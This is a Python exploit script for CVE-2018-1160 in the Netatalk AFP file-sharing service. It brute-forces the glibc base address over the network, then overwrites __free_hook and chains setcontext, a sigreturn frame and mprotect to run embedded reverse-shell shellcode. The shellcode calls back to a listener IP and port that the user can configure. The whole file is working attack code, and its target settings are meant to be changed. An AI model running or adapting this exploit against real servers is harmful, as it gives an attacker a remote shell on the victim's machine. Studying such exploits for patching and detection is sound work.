#MY EXPLOIT FOR CVE-2018-1160
#AUTHOR:TOMAPU
from pwn import *

libc=ELF('./libc-2.27.so')
context(log_level='ERROR')

#CHANGE THIS TO SET TARGET AND
targetip='172.17.0.2'
targetport=548
#CHANGE THIS TO MODIFY SHELLCODE
listenport=1234
listenip='172.17.0.1'

buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
buf += b"\x97\x48\xb9\x02\x00"+p16(listenport,endian='big')+socket.inet_aton(listenip)+b"\x51\x48"
buf += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
buf += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
buf += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
buf += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

shellcode=buf


def create_afp_cover_attnquantum(content):
    #cmd  = b'\x01'+ p8(16+8)+cyclic(16)+p64(targetaddr-2)
    cmd  = b'\x01'+ p8(len(content))+content
    dsi  = b'\x00\x04\x00\x01' 
    dsi += p32(0)
    dsi += p32(len(cmd),endian='big',) 
    dsi += p32(0)
    dsi += cmd
    return dsi

def create_afp_overwritefreehook_triggerfree(payload):
    afp_command = p8(0) # invoke the second entry in the table
    afp_command += b"\x00" # protocol defined padding
    afp_command += payload
    dsi_header = b"\x00" # "request" flag
    dsi_header += b"\x01" # "AFP" command
    dsi_header += b"\x00\x02" # request id
    dsi_header += b"\x00\x00\x00\x00" # data offset
    dsi_header += p32(len(afp_command),endian='big',)
    dsi_header += b'\x00\x00\x00\x00' # reserved
    dsi_header += afp_command
    return dsi_header


def checker(check,given):
    try:
        io = remote(targetip,targetport)
        check=p8(check)
        dsi=create_afp_cover_attnquantum(cyclic(19)+given+check)
        io.send(dsi)
        io.recv()
        io.close()
        return True 
    except:
        return False

def hack(guessaddress):
    libc.address=guessaddress

    freehook=libc.sym['__free_hook']
    targetaddr=freehook-2
    setcontext=libc.sym['setcontext']
    __libc_dlopen_mode=libc.sym['__libc_dlopen_mode']
    _dl_open_hook=libc.sym['_dl_open_hook']
    fgetpos64=libc.sym['fgetpos64']

    io = remote(targetip,targetport)
    try:
        #cover command->dsi to
        dsi=create_afp_cover_attnquantum(cyclic(16)+p64(freehook-2))
        io.send(dsi)
        io.recv()
        #mprotect!
        sigframe = SigreturnFrame(arch='AMD64')
        sigframe.rdi = libc.address & 0xfffffffffffff000# (freehook + 16) & 0xfffffffffffff000
        sigframe.rsi = 0x800000
        sigframe.rdx = 7
        sigframe.rax = 10
        sigframe.rsp = _dl_open_hook-0x8
        sigframe.rip = libc.sym['mprotect']



        Payload=(p64(__libc_dlopen_mode+56)+b'\x90'*100+shellcode).ljust((_dl_open_hook-freehook)-0x8)+p64(freehook+16)+p64(_dl_open_hook+8)+p64(fgetpos64+207)+24*b'z'+p64(setcontext+53)+bytes(sigframe)[0x28:]
        #mov    rax,QWORD PTR [rip+0x28a269]         0x7f385caa8588 <_dl_open_hook> ... line 1
        #call   QWORD PTR [rax]  ... line 2
        Payload=p64(__libc_dlopen_mode+56)
        #下一行写注释会报错???
        Payload+=b'\x90'*100+shellcode
        #add junk data and make it sprawn to _dl_open_hook
        Payload=Payload.ljust((_dl_open_hook-freehook)-0x8)
        #add address of shellcode. after sigreturn,the ret will jump to shellcode
        Payload+=p64(freehook+16)
        #ok here is the so-called "[rip+0x28a269]",the following content was written into rax in  line 1
        Payload+=p64(_dl_open_hook+8)
        #executed after line2, we use this to set rdi as rax(so that we can control memory it points to )
        #mov    rdi,rax # ... line 3
        #call   QWORD PTR [rax+0x20] # ... line 4
        Payload+=p64(fgetpos64+207)
        #add 24*'z' so that we can control content in  [rax+0x20] in line 4
        Payload+=24*b'z'
        #setcontext+53 has tons of code that we can control every register
        #mov    rsp,QWORD PTR [rdi+0xa0]
        #mov    rbx,QWORD PTR [rdi+0x80]
        #mov    rbp,QWORD PTR [rdi+0x78]
        #mov    r12,QWORD PTR [rdi+0x48]
        #mov    r13,QWORD PTR [rdi+0x50]
        #mov    r14,QWORD PTR [rdi+0x58]
        #mov    r15,QWORD PTR [rdi+0x60]
        #mov    rcx,QWORD PTR [rdi+0xa8]
        #push   rcx
        #mov    rsi,QWORD PTR [rdi+0x70]
        #mov    rdx,QWORD PTR [rdi+0x88]
        #mov    rcx,QWORD PTR [rdi+0x98]
        #mov    r8,QWORD PTR [rdi+0x28]
        #mov    r9,QWORD PTR [rdi+0x30]
        #mov    rdi,QWORD PTR [rdi+0x68]
        #xor    eax,eax
        #ret    
        Payload+=p64(setcontext+53)
        #use sigframe to generate sigreturn frame
        #call mprotect, make libc memory rwx, and return set _dl_open_hook-0x8 as rsp(so that we return to freehook+16)
        Payload+=bytes(sigframe)[0x28:]
        writeitfuck=create_afp_overwritefreehook_triggerfree(Payload)
        io.send(writeitfuck)
        io.recv()
        io.close()
    except:
        io.close()
        return



alreadyhave=b''

for count in range(3):
    print(f'[*]Checking at {count}')
    success=0
    for i in range(256):
        if checker(i,alreadyhave):
            print(f'[+]Brute success:{hex(i)}')
            alreadyhave=alreadyhave+p8(i)
            success=1
            break
    if not success:
        print('[-]What the fuck,brute failllllllled')
        exit(-1)

alreadyhave=[i for i in alreadyhave[::-1]]
alreadyhave[-1]+=1
address=alreadyhave[0]<<40|alreadyhave[1]<<32|alreadyhave[2]<<24
print("[+]Glibc address: 0x"+(''.join(["{0:02x}".format(i) for i in alreadyhave]))+"???000")
print("[*]Not let's brute rest of them!")



for i in range(0xfff):
    guessaddress=address+(i<<12)
    if i % 200 == 0:
        print(f'[*]Brute Progress{"{0:.0%}".format(i/0xfff)}, guessing at:{hex(guessaddress)}')
    hack(guessaddress)
